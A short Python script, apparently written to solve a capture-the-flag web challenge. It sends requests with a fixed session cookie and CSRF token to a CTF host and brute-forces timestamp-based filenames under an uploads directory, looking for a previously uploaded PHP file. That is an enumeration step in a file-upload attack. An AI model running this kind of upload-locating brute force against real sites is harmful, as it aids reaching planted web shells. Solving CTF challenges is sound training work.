import requests

cookies = {
    'PHPSESSID': 'gdoagmlhklpc53q797nsl2g3g2',
    'csrf_token': '42CWeQxOHRAAYhYk3KIw',
}

headers = {
    'Host': 'h3.l1n3.net:20280',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
}
for e in range(30,34):
    for i in range(0,999):
        url = 'http://h3.l1n3.net:20280/web03_4da2/uploads/201810201205'+str(e)+str(i)+'.php'
        response = requests.get(url, headers=headers, cookies=cookies)
        print(str(e)+":"+str(i)+":"+str(response.status_code))
        if(response.status_code == 200):
            print(url)
            break